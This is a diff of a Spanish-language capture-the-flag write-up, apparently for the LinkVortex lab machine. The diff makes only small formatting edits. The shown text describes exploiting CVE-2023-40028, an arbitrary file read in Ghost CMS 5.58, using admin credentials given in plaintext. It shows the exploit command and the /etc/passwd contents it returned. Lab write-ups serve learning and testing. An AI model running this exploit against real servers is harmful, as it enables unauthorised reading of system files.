@@ -458,7 +458,7 @@ Realicé un ataque con **Intruder** de **BurpSuite**, logré identificar la cont
 De acuerdo con la versión del CMS **Ghost 5.58**, esta se encuentra afectada por una vulnerabilidad que permite la lectura de archivos arbitrarios en el servidor, de forma similar a un **LFI**. El único requisito es contar con credenciales válidas en el portal de administración, por lo que fue posible aprovecharla sin inconvenientes.
 
 ```bash
-┌──(root㉿kali)-[/opt]
+──(root㉿kali)-[/opt]
 └─# ./CVE-2023-40028 -u admin@linkvortex.htb -p 'OctopiFociPilfer45' -h http://linkvortex.htb/                 
 WELCOME TO THE CVE-2023-40028 SHELL
 Enter the file path to read (or type 'exit' to quit): /etc/passwd       
@@ -483,10 +483,10 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 node:x:1000:1000::/home/node:/bin/bash
-Enter the file path to read (or type 'exit' to quit): 
+Enter the file path to read (or type 'exit' to quit):
+
+
 ```
-
-
 
 
 ## Escalada de privilegios
